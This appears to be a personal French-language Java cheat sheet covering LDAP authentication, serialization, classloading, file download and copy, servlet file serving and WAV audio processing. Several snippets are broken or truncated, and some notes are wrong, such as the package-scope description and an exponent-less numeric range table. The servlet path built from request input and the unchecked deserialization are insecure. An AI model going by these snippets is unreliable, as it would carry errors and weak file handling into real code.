                              Methode3:pour faire une recherche ldap recuperer le groupe d'un user et verifier que le user appartien bien à ce groupe:
                                          NamingEnumeration results = dirContext.search(this.baseDN, filter, constraints);
                                          LdapEdsnUser user = null;
                                          if (results.hasMoreElements()) 
                                          {
                                            SearchResult result = (SearchResult)results.nextElement();
                                            String id = getAttributeValue(result, "cn");
                                            String firstName = getAttributeValue(result, "unattribut");
                                            Attributes attributes = result.getAttributes();
                                            for (Enumeration<String> e = attributes.getIDs(); e.hasMoreElements();) 
                                            {
                                            	logger.error("Debugflag9102 "+e.nextElement());
                                            }
                                            // recuperer le groupe d'un user...
                                            Attribute attribute = attributes.get("memberOf");//"memberOf" ou autre chose
                                            Set<String> groupDNs = new HashSet<String>();
                                            NamingEnumeration enumeration = attribute.getAll();
                                            while (enumeration.hasMoreElements()) 
                                            {
                                                Object value = enumeration.nextElement();
                                                groupDNs.add(value.toString());
                                            }
                                            // verifier que le user est bien dans ce groupe
                                           for (String groupDN : groupDNs) 
                                           {
                                              Attributes groupAttributes = dirContext.getAttributes(groupDN, new String[] { "cn" }); //"cn" ou autre chose
                                              Attribute groupAttr = groupAttributes.get("cn");
                                              String groupId = groupAttr.get().toString();
                                              EdsnGroup group = EdsnGroupUtils.parse(groupId);
                                              groups.add(group);
                                           }
                                         }
 
                      	context.close();
                      	return true;
                      } catch (AuthenticationException e) {
                      	if (logger.isDebugEnabled()) {
                      		logger.debug("Authentication failed for user " + userId + ": " + e.getMessage());
                      	}
                      	return false;
                      } catch (LoginException e) {
                          logger.error(e.getMessage());
                          return false;
                      } 
                      catch (NamingException e) {
                         // Air France : affichage pour debug
                         logger.info(distinguishedName + "," + e);
              
                         if (e.getMessage().startsWith("[LDAP: error code 19")) {
                            
                            if (e.getMessage().endsWith("suspendu]")) {
                               throw new AuthenticationException("Erreur HABILE : compte suspendu", e);
                            } else if (e.getMessage().endsWith("expire]")) {
                               throw new AuthenticationException("Erreur HABILE : mot de passe expire", e);
                            } else {
                               throw new AuthenticationException("Erreur HABILE : mot de passe reinitialise ou compte inactif", e);
                            }
                       
                         } else if (e.getMessage().startsWith("[LDAP: error code 49")) {
                             throw new AuthenticationException("Erreur HABILE : couple login/mot de passe non valide", e);
                         } else {
                             //throw new AuthenticationException("Erreur d'authentification LDAP", e);
                             throw new AuthenticationException("Erreur d'authentification HABILE", e);
                         }
                      } 
              	}
pour faire du ldaps :
            protected void setupSsl(Hashtable env) throws LoginException {
                    try {
                        logger.debug("Setting up SSL");
                        env.put(Context.SECURITY_PROTOCOL, "ssl");
                        env.put("java.naming.ldap.factory.socket", ManagedSSLSocketFactory.class.getName());
                        SSLSocketFactory socketFactory = (SSLSocketFactory) getSSLSocketFactory();
            
                        ManagedSSLSocketFactory.setSocketFactory(socketFactory);
                        Thread.currentThread().setContextClassLoader(ManagedSSLSocketFactory.class.getClassLoader());
                    } catch (Exception e) {
                        throw new LoginException("Unable to setup SSL support for LDAP: " + e.getMessage());
                    }
                }
            
                public static abstract class ManagedSSLSocketFactory extends SSLSocketFactory {
            
                    private static final ThreadLocal<SSLSocketFactory> factories = new ThreadLocal<SSLSocketFactory>();
            
                    public static void setSocketFactory(SSLSocketFactory factory) {
                        factories.set(factory);
                    }
            
                    public static SSLSocketFactory getDefault() {
                        SSLSocketFactory factory = factories.get();
            
                        if (factory == null) {
                            throw new IllegalStateException("No SSLSocketFactory parameters have been set!");
                        }
                        return factory;
                    }
                }                  	
      
pour faire un upload telecharger en https regarder code de mathieu:
                uploadItem(httpClient, httpHost, headers, resource, fileName, annotations);
encoder en base 64 encoder en base64 : (depuis java 1.8 utiliser java.util.Base64)
      byte[] token = unstring.getBytes(Charset.forName("UTF-8"));
		  String unStringEncodeEnBase64=Base64.encodeBase64String(token));
Decoder de base64 
		      String toto = new String(Base64.decodeBase64(unStringEncodeEnBase64));
          ou
          String sUserPwdDecode = new String(Base64.getDecoder().decode(sUserPwdCode));  
recherche existance d'un objet dans une liste : dans l'objet redefinir equals : et je pourrais alors utiliser "contains"
      @Override
    public boolean equals(Object v) {
        boolean retVal = false;

        if (v instanceof Price){
            Price ptr = (Price) v;
            retVal = ptr.id == this.id;
        }
        return retVal;
    }

recherche trouver un element dans un tableau avec la recherche dichotomique : voir tribul hipsort 
        static boolean exists(int[] ints, int k)
    {
        int res = rechercheDicho(ints, ints.length, k);
        if (res==-1)
        {
            return false;
        }
        else return true;
    }
    private static	int rechercheDicho(int tab[], int nbVal, int val) //tableau, taille tableau, valeur cherchee
    {
              /* declaration des variables locales à la fonction */
        boolean trouve;  //vaut faux tant que la valeur "val" n'aura pas ete trouvee
        int id;  //indice de debut
        int ifin;  //indice de fin
        int im;  //indice de "milieu"
                                                          
              /* initialisation de ces variables avant la boucle de recherche */
        trouve = false;  //la valeur n'a pas encore ete trouvee
        id = 0;  //intervalle de recherche compris entre 0...
        ifin = nbVal;  //...et nbVal

              /* boucle de recherche */
        while(!trouve && ((ifin - id) > 1))
        {

            im = (id + ifin)/2;  //on determine l'indice de milieu

            trouve = (tab[im] == val);  //on regarde si la valeur recherchee est à cet indice

            if(tab[im] > val) ifin = im;  //si la valeur qui est à la case "im" est superieure à la valeur recherchee, l'indice de fin "ifin" << devient >> l'indice de milieu, ainsi l'intervalle de recherche est restreint lors du prochain tour de boucle
            else id = im;  //sinon l'indice de debut << devient >> l'indice de milieu et l'intervalle est de la même façon restreint
        }

              /* test conditionnant la valeur que la fonction va renvoyer */
        if(tab[id] == val) return(id);  //si on a trouve la bonne valeur, on retourne l'indice
        else return(-1);  //sinon on retourne -1

    }
pour creer un fichier temporaire de travail : 
  nomFichierTemporaireCourant = File.createTempFile super pratique car genere lui meme le nom du fichier aleatoires
  nomFichierTemporaireCourant.deleteOnExit(); // supprime le fichier quand la JVM a fini le process
sauver serialiser en java des objets java dans un fichier et pouvoir les recuperer : // pour avoir un controle max sur la serialisation serializer serialization mon objet doit implementer Externalizable voir LINKlkgkgkhgkfdlkjfglk
           File file = new File("Users.dat");
           FileOutputStream fos;
           fos = new FileOutputStream(file); 
           ObjectOutputStream oos = new ObjectOutputStream(fos);
         oos.writeObject(UnObjetJavaQuiPeutEtreComplexeMemeUneListe);
         oos.close();
    Recuperer les donnees : 
              FileInputStream fis = new FileInputStream(file);
                    ObjectInputStream ois = new ObjectInputStream(fis);
                    userList = (List<User>) ois.readObject();
                    ois.close();
    LINKlkgkgkhgkfdlkjfglk quand ma classe implement Externalizable je peux avoir un super controle de la serialisation. Si pas besoin de controle alors implementer Serializable suffit. fonctione que pour objectOutputStream (serialisation xml ne passe pas par là)                    
   @Override                                         
    public void writeExternal(ObjectOutput out) throws IOException  
    {
        out.writeObject(getKey());                                  // l'ordre des objets ecrits et relus doit etre respecte 
        out.writeObject(getDesignation());
        out.writeObject(getDescription());
        out.writeObject(getComment());
        out.writeObject(getPercent());
        out.writeObject(getVolumesPerYear());
        out.writeObject(getRevenues());
        //out.writeObject(getNodeBooleanExpression()); //TODO: passer de String à booleanExpression
        out.writeObject(new ArrayList(classificationNodes));
        out.writeObject(new ArrayList(getAllocations()));   // grace à Externalizable ici je converti l'observableList en arraylist pour reussir la serialisation
    }
    @Override
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException
    {
        setKey((String)in.readObject());
        setDesignation((String)in.readObject());
        setDescription((String)in.readObject());
        setComment((String)in.readObject());
        setPercent((Double)in.readObject());
        setVolumesPerYear((HashMap)in.readObject());
        setRevenues((Double)in.readObject());
        //setNodeBooleanExpression((IBooleanExpressionNode)in.readObject());
        setClassificationNodes(FXCollections.observableArrayList((ArrayList<ClassificationNode>)in.readObject()));
        setAllocations(FXCollections.observableArrayList((ArrayList<Allocations<FeatureInstance,ComponentInstance>>)in.readObject()));
    }        
    avant:    pour serializer un objet: On ne peut pas serialiser une SimpleListProperty ou ObservableList: il faut la wrapper dans une classe 
			public class Transporteur implements Serializable
			{
			private static final long serialVersionUID = 1L; voir LINKldsgserialsdflkjegml
Serializer serialiser une classe java au format xml quon peut sauver importer exporter 
    attention pour que ça marche les classes que je serialise doivent avoir:  (sinon pour une serialisation binaire voir LINKlksdflqgllglglg et pour un meilleur controle seulement: implements Externalizable et il faut overrider les methodes de cette interface comme ci-dessous ) MAIS surtout ne pas oublier de mettre un constructeur vide et les getters et setters
    attention aussi les champs observables doivent etre declarés comme ca
                                            private final ListProperty<PartInstance> referencielPartInstances =new SimpleListProperty<>(FXCollections.observableArrayList(new ArrayList<>())) ;
                                            ET PAS COMME CA : private final ListProperty<FeatureGeneric> featureRoot = new SimpleListProperty<>(FXCollections.observableArrayList()); 
                                                                                                    @Override (Facultatif voir LINKlksdflqgllglglg)
                                                                                                    public void writeExternal(ObjectOutput out) throws IOException
                                                                                                    {
                                                                                                        out.writeObject(getX());
                                                                                                        out.writeObject(getY());
                                                                                                    }
                                                                                                    @Override
                                                                                                    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException
                                                                                                    {
                                                                                                        setX((X)in.readObject());
                                                                                                        setY((Y)in.readObject());
                                                                                                    } 
  Serializer serialiser une classe java au format xml quon peut sauver importer exporter convertir java xml (pas besoin d'implementer Externalizable).
        pour que ca marche il faut un constructeur vide et les getters et setteurs publics! 
            @Test                                                                                    
    public void saveXml() throws FileNotFoundException
    {
            BusinessModelRoot root = new BusinessModelRoot();
            final FileChooser dialog = new FileChooser();
            File saveFile = new File(SaveXMLTest.class.getClassLoader().getResource("savexml.xml").getPath());
                XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream(saveFile)));
                xmlEncoder.writeObject(root);
                xmlEncoder.flush();
                xmlEncoder.close();
        }
        et pour faire l'inverse : 
              public Object deSerialize(String name) throws FileNotFoundException
              {
                  File loadedFile = new File(name+".xml");
                  XMLDecoder xmlDecoder = new XMLDecoder(new FileInputStream(loadedFile));
                  Object ret= xmlDecoder.readObject();
                  return ret;
              }            
Dynamic Dynamique classe loading classloader hotde recharger une classe: issu de http://tutorials.jenkov.com/java-reflection/dynamic-class-loading-reloading.html
          // l'unicite d'une classe est defini par son package, son nom et le classloader qui l'a charge. Un classloader ne recharge jamais une classe qu'il a dejà charge (detecte par cet id unique :package/nom/classloader)
                                  //creer une classloader qui etend classloader parent.
                                    public class MyClassLoader extends ClassLoader{ (// a voir utiliser URLClassLoader capable de lire dans des .jar)
                                    
                                        public MyClassLoader(ClassLoader parent) {
                                            super(parent);
                                        }
                                    
                                        public Class loadClass(String name) throws ClassNotFoundException { //methode appellee par la jvm chaque fois qu'une classe de mon application fait un new UneClasse()
                                            if(!"mon.package.maClasse".equals(name))
                                            { //Toutes les autres classes que je ne veux pas reactualiser doivent être chargees par le classloader parent
                                                    return super.loadClass(name); //invoquera findClass(String name) pour d'abord trouver la classe si elle est déja chargee 
                                             }
                                            try {
                                            // on force le rechargement de la classe
                                                String url = "file:C:/data/projects/tutorials/web/WEB-INF/classes/reflection/MaClasse.class"; // le path vers la classe que je veux reloader
                                                URL myUrl = new URL(url);
                                                URLConnection connection = myUrl.openConnection();
                                                InputStream input = connection.getInputStream();
                                                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                                                int data = input.read();
                                    
                                                while(data != -1){
                                                    buffer.write(data);
                                                    data = input.read();
                                                }
                                    
                                                input.close();
                                    
                                                byte[] classData = buffer.toByteArray();
                                    
                                                return defineClass("mon.package.maClasse", classData, 0, classData.length); //defineClass transforme un array of bytes en une instance de classe.
                                    
                                            } catch (MalformedURLException e) {
                                                e.printStackTrace();
                                            } catch (IOException e) {
                                                e.printStackTrace();
                                            }
                                    
                                            return null;
                                        }
                                    
                                    }
                                    
                          Comment utiliser ce classloader:
                                    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException 
                                    {
                                        ClassLoader parentClassLoader = MyClassLoader.class.getClassLoader();
                                        MyClassLoader classLoader = new MyClassLoader(parentClassLoader);
                                        Class maClasse = classLoader.loadClass("mon.package.maClasse");
                                    
                                        ImaClasseInterface object1 =(ImaClasseInterface) maClasse.newInstance(); // on est oblige de creer une interface ou une super-classe à l'objet que je veux reloader. Cet interface ou super classe elle ne doit pas être reloade par le classe loader. Elle doit être loade une fois par le classloader parent (comme toutes les autres classes d'ailleurs)
                                         // deuxieme exemple avec une super classe. On peut utiliser interface ou super classe.                                    
                                        MaClasseSuperClass object2 =(MaClasseSuperClass) maClasse.newInstance();
                                    
                                        //Et ci-dessous, je reload ma classe! Je la rafraichis!:
                                        classLoader = new MyClassLoader(parentClassLoader);
                                        maClasse = classLoader.loadClass("mon.package.MaClasse");
                                        object1 = (ImaClasseInterface)  maClasse.newInstance();
                                        object2 = (MaClasseSuperClass) maClasse.newInstance();
                                    }
                                    
                                    Et voici ma classe qui herite MaClasseSuperClass et implemente ImaClasseInterface mais on a pas desoin de mettre deux parents comme ca: on peut juste mettre une interface ou une superclasse:
                                    public class MaClasse extends MaClasseSuperClass implements MaClasseInterface
                                    {
                                        //... body of class ... override superclass methods
                                        //    or implement interface methods
                                    }
boucles :
    break : sort de la boucle
    continue : dans une boucle, passe à l'iteration suivante de la boucle sans executer la suite dans la boucle.
    utiliser iterator si on veut supprimer les elements d'une liste dans laquelle on boucle loop avec iterator.remove. Si on a besoin de l'index parcourir a l'enver
pour savoir si un char est un apostrophe :
  if(c == '\'')...
Pour recuperer telecharger downloader un fichier java à partir d'une url http lien et stocker ce fichier localement :
	 public static void urlFileToLocalFile(String urlFullpath, String localFullPath)
	    {
	        InputStream input = null;
	        FileOutputStream writeFile = null;

	        try
	        {
	        //requete requette get
	            URL url = new URL(urlFullpath);
	            URLConnection connection = url.openConnection();
	            int fileLength = connection.getContentLength();

	            if (fileLength == -1)
	            {
	                System.out.println("Invalide URL or file.");
	                return;
	            }

	            input = connection.getInputStream();
	            String fileName = url.getFile().substring(url.getFile().lastIndexOf('/') + 1);
	            writeFile = new FileOutputStream(localFullPath); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
	            byte[] buffer = new byte[1024];
	            int read;

	            while ((read = input.read(buffer)) > 0)
	                writeFile.write(buffer, 0, read);
	            writeFile.flush();
	        }
	        catch (IOException e)
	        {
	            System.out.println("Error while trying to download the file.");
	            e.printStackTrace();
	        }
	        finally
	        {
	            try
	            {
	                writeFile.close();
	                input.close();
	            }
	            catch (IOException e)
	            {
	                e.printStackTrace();
	            }
	        }
	    }
Generer un fichier pdf avec Jasper et des donnees data:
	@Test
	public void testJasper()
	{
	try { 
			HashMap hm = new HashMap<String,String>(); 
		String filePath="d:\\Profiles\\ndubechot\\Desktop\\Capit RenoiRH\\xml files\\NUMMAR.xml"; // donnees 
		InputStream inputStream = new FileInputStream(new File(filePath)); //chemin absolu necessaire 
		JRXmlDataSource ds=new JRXmlDataSource(inputStream,"/"); 
		ds.setDatePattern(date_pattern_jasperreport);
		ds.setLocale(new Locale("fr","FR"));
		JasperReport jasperReport;
		JasperPrint jasperPrint; 
		jasperReport = JasperCompileManager.compileReport("d:\\Profiles\\ndubechot\\Desktop\\RPT013.jrxml"); // template besoin fichiers .jasper aussi au meme endroit
		jasperPrint = JasperFillManager.fillReport(jasperReport, hmOuNull, ds); 
		JasperExportManager.exportReportToPdfFile(jasperPrint, "d:\\Profiles\\ndubechot\\Desktop\\simple_report.pdf"); 
		} 
    catch (Exception e) {
     e.printStackTrace();
     }
	}}
Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser : 
                    public static void downloadFichier(HttpServletRequest request, HttpServletResponse response, String type_PJ, String nomFichier) throws DaoException
                    	{
                    		String debut_msgConsole = "ERROR FROM PJsDao.downloadFichier()";
                    		try
                    		{
                    		byte[] bytes = Files.readAllBytes(Paths.get(unObjetURL.getPath())));
                    		avant: 
                    			String filePath = getUploadDirectory(request) + "/" + type_PJ + "/" + nomFichier ;
                    			FileInputStream stream = new FileInputStream(filePath); //chemin absolu necessaire
                    			byte buf[] = new byte[stream.available()];
                    			stream.read(buf);
                    			response.reset();
                    			response.setHeader("Expires", "0") ;
                    			response.setHeader("Cache-Control","must-revalidate, post-check=0, pre-check=0, public");
                    			
                    			if(StringHelper.getExtensionFichier(nomFichier).equalsIgnoreCase("html"))
                    			{
                    				response.setContentType("text/html");
                    			}
                    			else
                    			{
                    				response.setContentType("application/x-file-download");
                    				response.setHeader("Content-Disposition", "attachment; filename=" + nomFichier);
                    			}
                    			
                    			ServletOutputStream outStream = response.getOutputStream();
                    			outStream.write(buf) ;
                    			outStream.flush();
                    			stream.close();// pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
                    			outStream.close();
                    			//BufferedInputStream  bis = new BufferedInputStream(stream);
                    			//outStream.write()
                    		}

si sur unix j'ai le message "processus arrete" a l'execution d'un batch
    du java prend trop de memoire, virer une tache java
pour lire le java.library.path: 
    System.getProperty("java.library.path");// recupère prop de la jvm voir LINKù*ù
pour executer un programme en 64bits : 
      /usr/local/java/bin/java -d64 -Dfile.encoding=ISO-8859-15 -Dlog4j.configuration=log4j.properties -jar Parser-1.0.0.jar nomProjet test0 FrenchIvona fox.txt projet@memoclap.com
pour ajouter une librairie dll :car erreur native manquant: ou dependency blabla
        ajouter les .dll sous mon C:\Program Files\Java\jdk1.7.0\jre\bin\là. ou sous : C:\Program Files\Java\jdk1.7.0\bin\là
  si c'etait sur unix on met libjivonatts_native.so là: 
      /usr/lib
  envoyer des arguments à la jvm : 
      java -Darg1=foo1 -Darg2=foo2  -Darg3=foo3 com.MyClass
   ajouter les librairies en bloc qui elles se trouvent dans un repertoire : pas besoin de les noter une à une : 
      java -Djava.endorsed.dir=path/vers/repertoire/contenant/les/jar ... 
donnees variables numeriques:
        Type	Signification	Taille (en octets)	Plage de valeurs acceptees
        char	Caractère Unicode	2	'\u0000' → '\uffff' (0 à 65535)
        byte	Entier très court	1	-128 → +127
        short	Entier court	2	-32 768 → +32 767
        int	Entier	4	-231≈-2,147×109 → +231-1≈2,147×109
        long	Entier long	8	-263≈-9,223×1018 → +263-1≈9,223×1018
        float	Nombre reel simple	4	±2-149≈1.4×10-45 → ±2128-2104≈3.4×1038
        double	Nombre reel double	8	±2-1074≈4,9×10-324 → ±21024-2971≈1,8×10308
        boolean	Valeur logique (booleen)	1	true (vrai), ou false (faux)
Connaitre la duree d'un son en secondes: 
    	public static int getLenghtInSecond(AudioInputStream bOrig) 
    	{
    		AudioFormat format = bOrig.getFormat();
    	  return (int) (bOrig.getFrameLength() / format.getFrameRate());
    	}
pour convertire un wav foireux en bon wave
	public static void convertWav(File fi) throws Exception 
	{
		File temp = new File(fi.getPath()+"temp.wav");
		AudioInputStream clip1 = AudioSystem.getAudioInputStream(fi);
		AudioFormat sourceFormat = clip1.getFormat();
	//	long long1 = clip1.getFrameLength();
        AudioFormat convertFormat = new AudioFormat(AudioFormat.Encoding.PCM_FLOAT, sourceFormat.getSampleRate(), 16, sourceFormat.getChannels(), sourceFormat.getChannels()*2, sourceFormat.getFrameRate(), false);
        AudioInputStream convert1AIS = AudioSystem.getAudioInputStream(convertFormat, clip1);
        AudioSystem.write(convert1AIS, AudioFileFormat.Type.WAVE, temp);
        convert1AIS.close();
        clip1.close();
        fi.delete();
        temp.renameTo(fi); // pour deplacer bouger move un fichier voir LINKjgdlkqjfqdgmlk
	}
pour mixer deux sons ou meme plus :
	      AudioInputStream clip1 = AudioSystem.getAudioInputStream(new File("C:/wamp/www/kanail/AudioLoopOnline/sons/20121107963241352287465954/1531352287502673=Lovely0.wav"));
        AudioInputStream clip2 = AudioSystem.getAudioInputStream(new File("C:/wamp/www/kanail/AudioLoopOnline/sons/20121107963241352287465954/1531352287502673=Lovely1.wav"));
        pour initialiser rapidement une arraylist : shortcut :
              List<Price> lp =  new ArrayList<Price>(Arrays.asList(p,d,a,e)); // pour creer une liste rapidement
        List<AudioInputStream> audio = new ArrayList<AudioInputStream>();
        audio.add(clip1);
        audio.add(clip2);
        AudioInputStream res = mixAudio(audio);
        AudioSystem.write(res, AudioFileFormat.Type.WAVE, new File("C:/wamp/www/kanail/AudioLoopOnline/sons/20121107963241352287465954/Aeffacer.wav"));
            	
            	private static AudioInputStream mixAudio(List<AudioInputStream> audio) throws IOException
            	{
            	    ArrayList<byte[]> byteArrays = new ArrayList();
            	    long size = 0;
            	    int pos = 0;
            	    for(int i = 0; i < audio.size(); i++){
            	        AudioInputStream temp = audio.get(i);
            	        byteArrays.add(convertStream(temp));
            	        if(size < temp.getFrameLength()){
            	            size = temp.getFrameLength();
            	            pos = i;
            	        }
            	    }
            	    byte[] compiledStream = new byte[byteArrays.get(pos).length];
            	    for(int i = 0; i < compiledStream.length; i++){
            	        int byteSum = 0;
            	        for(int j = 0; j < byteArrays.size(); j++){
            	            try{
            	                byteSum += byteArrays.get(j)[i];
            	            }catch(Exception e){
            	                byteArrays.remove(j); // bien respecter le type de j
            	            }
            	        }
            	        compiledStream[i] = (byte) (byteSum / byteArrays.size());
            	    }
            
            	    return new AudioInputStream(new ByteArrayInputStream(compiledStream), ((AudioInputStream)audio.get(pos)).getFormat(), ((AudioInputStream)audio.get(pos)).getFrameLength());
            	}
            
            	private static byte[] convertStream(AudioInputStream stream) throws IOException
            	{
            	    ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
            	    byte[] buffer = new byte[1024];
            	    int numRead;
            
            	    while((numRead = stream.read(buffer)) != -1){
            	        byteStream.write(buffer, 0, numRead);
            	    }
            
            	    return byteStream.toByteArray();
            	}
pour faire un sub audio: une partie d'un fichier audio :
      private static AudioInputStream subAudio(AudioInputStream inputStream,int startSecond, int secondsToCopy, AudioFileFormat fileFormat) throws Exception 
    	{
    		
    		  AudioFormat format = fileFormat.getFormat();
    		  int bytesPerSecond = format.getFrameSize() * (int)format.getFrameRate();
    		  inputStream.skip(startSecond * bytesPerSecond);
    		  long framesOfAudioToCopy = secondsToCopy * (int)format.getFrameRate();
    		  AudioInputStream shortenedStream = new AudioInputStream(inputStream, format, framesOfAudioToCopy);
    		  return shortenedStream;
    	
dans un listener, quand on fait this on a pas accès au parent du listener: pour acceder au parent contenanant le listener, faire ca :
    MaClasseParente.this.monObjetDansMaClasseParente.monParamDansMaClasseParente=2;
les scopes:    
    public : un element public est accessible de partout et sans aucune restriction. Certaines classes (comme la classe principale main) doivent obligatoirement être declarees publiques (pour pouvoir executer l'application...)
    protected : un element protected (protege) est accessible uniquement aux classes d'un package et à ses classes filles
    private : un element private (prive) est accessible uniquement au sein de la classe dans laquelle il est declare. Ces elements ne peuvent être manipules qu'à l'aide de methode specifiques appeles accesseur et mutateur
    "friendly" : un element est friendly par defaut (cette appellation n'est pas officielle et est empruntee au langage C++) est accessible uniquement aux classes d'un package et à ses classes filles.
faire un peu durer le temps: 
        	  			 long start = System.currentTimeMillis();
        	  			long end = System.currentTimeMillis() + (1000*2);
        	  			  while ( System.currentTimeMillis() <= end) 
        	  			  {
        	  					//log.debug("wait...");
        	  					// jattends quil se bouge le cul
        	  			  }
pour attendre qu'une resource se libere : 
    int i=0;
	    	while (!file.exists())
	    	{
	    		Thread.sleep(800);
	    		i++;
	    		if (i==4)
	    		{
	    			break;
	    		}
	    	}        	  			  
pour imposer qu'il ya  qu'une seule instance de mon batch java qui tourne : 
              Une astuce possible est d'utiliser une ServerSocket, du package java.net. On peut lancer un tel type de socket (sur un port precis) 
              lors de l'execution du main. Si une Exception est levee, cela indique qu'une instance de l'application est dejà en train de tourner.
              Voici un exemple : 
              private static int PORT = 12345; 
              public static void main(String[] args) { // on peut mettre des espaces dans args : java ... com.execute.Main "un args avec des espaces" 
                    try { 
                       ServerSocket listener = new ServerSocket(PORT);  // THIS, ecoute sur le port numero PORT. (le programme continue) ce port est désormais reservé. Plusieurs client peuvent communiquer avec THIS et pour chaque client qui se connecte un Socket different est attribué sur ce port.
                       System.out.println("Instance du programme unique"); 
                    }catch(Exception e){ 
                       System.out.println("Il y a deja une instance du programme active"); 
                       System.exit(0); 
                    } 
              }
              sinon on peut ecrire dans un fichier ou mieux dans la base comme ca on peut changer la valeur dans la base 
pour copier un fichier :
                  public static boolean copyFile(String srcPath, String dstPath) throws Exception {
                  		boolean isDone = false;
                  		
                          // Create channel on the source
                          FileChannel srcChannel = new FileInputStream(srcPath).getChannel();
                      
                          // Create channel on the destination
                          FileChannel dstChannel = new FileOutputStream(dstPath).getChannel(); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                      
                          // Copy file contents from source to destination
                          dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
                      
                          // Close the channels
                          srcChannel.close();
                          dstChannel.close();
                  	    isDone=true;    
                  		return isDone;
                  	}
                  	OU BIEN
                      public static boolean copier( File source, File destination ){ //Methode permettant la copie d'un fichier 
                      boolean resultat = false; 
                      
                      // Declaration des flux 
                      java.io.FileInputStream sourceFile=null; 
                      java.io.FileOutputStream destinationFile=null; 
                      try { 
                      // Creation du fichier : 
                      destination.createNewFile(); 
                      // Ouverture des flux 
                      sourceFile = new java.io.FileInputStream(source); 
                      destinationFile = new java.io.FileOutputStream(destination); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true 
                      // Lecture par segment de 0.5Mo 
                      byte buffer[]=new byte[512*1024]; 
                      int nbLecture; 
                      while( (nbLecture = sourceFile.read(buffer)) != -1 ) { 
                      destinationFile.write(buffer, 0, nbLecture); 
                      } 
                      
                      // Copie reussie 
                      resultat = true; 
                      } catch( java.io.FileNotFoundException f ) { 
                      } catch( java.io.IOException e ) { 
                      } finally { 
                      // Quoi qu'il arrive, on ferme les flux 
                      try { 
                      sourceFile.close(); 
                      } catch(Exception e) { } 
                      try { 
                      destinationFile.close(); 
                      } catch(Exception e) { } 
                      } 
                      return( resultat ); 
                      }
pour savoir si une chaine de characteres est toute en majuscule ou minuscule : 
    	public boolean isOnlyMaj(String tok)
    	{
    		boolean enMaj = true;
    		for(int i = 0; i < tok.length() && enMaj; i++) {
    		if(!Character.isUpperCase(tok.charAt(i)))
    		enMaj = false;
    		}
    		return enMaj;
    	}

petite fonction utile :getKeyByValue d'une Hashmap :
          private int getKeyByValue(LinkedHashMap<Integer, Object> acteurList, String trim) throws Exception  {
          		int ret = -1;
          		int tmp = 0;
          		Iterator<Integer> it = acteurList.keySet().iterator();
          		while (it.hasNext())
          		{
          			tmp = it.next();
          			if (acteurList.get(tmp).toString().equals(trim))
          			{
          				ret = tmp;
          				break;
          			}
          		}
          		return ret;
          	}

pour recuperer en secondes la duree d'un fichier wav :
                          public void getDurationOfWavInSeconds(File file) throws Exception
                          	{   
                          	    AudioInputStream stream = null;
                          	    try 
                          	    {
                          	    	while (!file.exists())
                          	    	{
                          	    		Thread.sleep(800);
                          	    	}
                          	        stream = AudioSystem.getAudioInputStream(file);
                          
                          	        AudioFormat format = stream.getFormat();
                          
                          	        Double secDouble = file.length() / format.getSampleRate() / (format.getSampleSizeInBits() / 8.0) / format.getChannels();
                          	        this.audioLoopMain.z = this.audioLoopMain.z+ secDouble;
                          	    }
                          	    catch (Exception e) 
                          	    {
                          	        // log an error
                          	    
                          	        throw e;
                          	    }
                          	    finally
                          	    {
                          	        try { stream.close(); } catch (Exception ex) { } // pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
                          	    }
                          	}

pour generer un nom de fichier de maniere aleatoire :pour generer une chaine de charactères aleatoires: LINK_haqsdfsaqsdfrd
                    java.util.UUID.randomUUID().toString(); // fait pour générer des ID identifiants uniques
                    ou
                	public static String generateFileName(String prefix, Integer max, String ext) throws Exception {
                    		Random random = new Random(Runtime.getRuntime().freeMemory());  (voir aussi uuid)
                    		String nomFichier= prefix+Integer.toString(random.nextInt(max))+Long.toString(Calendar.getInstance().getTime().getTime())+ext;
                    		if(nomFichier.length()-ext.length()>30)
                    		{
                    			nomFichier=nomFichier.substring(0,30)+ext;
                    		}
                    		File test= new File(AudioLoopProperties.getInstance().props.getProperty("TEMP_PATH")+AudioLoopMain.getInstance().idProjet+File.separator+nomFichier);
                    		while(test.exists())
                    		{
                    			log.debug(nomFichier +" existe deja recherche autre nom...");
                    			nomFichier= prefix+Integer.toString(random.nextInt(max))+Long.toString(Calendar.getInstance().getTime().getTime())+ext;
                    			test= new File(AudioLoopProperties.getInstance().props.getProperty("TEMP_PATH")+AudioLoopMain.getInstance().idProjet+File.separator+nomFichier);
                    			log.debug(nomFichier +" existe deja recherche autre nom...");
                    		}
                    		return nomFichier;
                    	}

pour concatener deux fichiers WAV :
              private static AudioInputStream concatenate(AudioInputStream first, AudioInputStream second) throws Exception
              	{
              		AudioFormat  audioFormat = first.getFormat();
                      Long frameLength = null;
                      ByteArrayOutputStream byteOutputStream = new ByteArrayOutputStream();
                      frameLength = first.getFrameLength();
                      frameLength += second.getFrameLength();
                      List<AudioInputStream> audioInputStreamList = new ArrayList<AudioInputStream>();
                      audioInputStreamList.add(first);
                      audioInputStreamList.add(second);
                      AudioSystem.write(new AudioInputStream(new SequenceInputStream(Collections.enumeration(audioInputStreamList)), audioFormat, frameLength), AudioFileFormat.Type.WAVE, byteOutputStream);
                      return new AudioInputStream(new ByteArrayInputStream(byteOutputStream.toByteArray()),audioFormat, frameLength);
              	}		
              autre facon (plutot base sur File)
              public void wavAppenderPair(String nomFichier1, String nomFichier2) throws Exception {
              	                    AudioInputStream clip1 = AudioSystem.getAudioInputStream(new File(nomFichier1));
              	                    AudioInputStream clip2 = AudioSystem.getAudioInputStream(new File(nomFichier2));
              	                    SequenceInputStream seq = new SequenceInputStream(clip1, clip2);
              	                    if (this.firstAudioFormat==null)
              	                    {
              	                    	this.firstAudioFormat = clip2.getFormat();
              	                    }
              	                    AudioInputStream appendedFiles = new AudioInputStream(seq , this.firstAudioFormat,clip1.getFrameLength() + clip2.getFrameLength());
              
              	                    String nomFichier = generateFileName("temp", 200000);
              	            		File temp = new File(nomFichier);
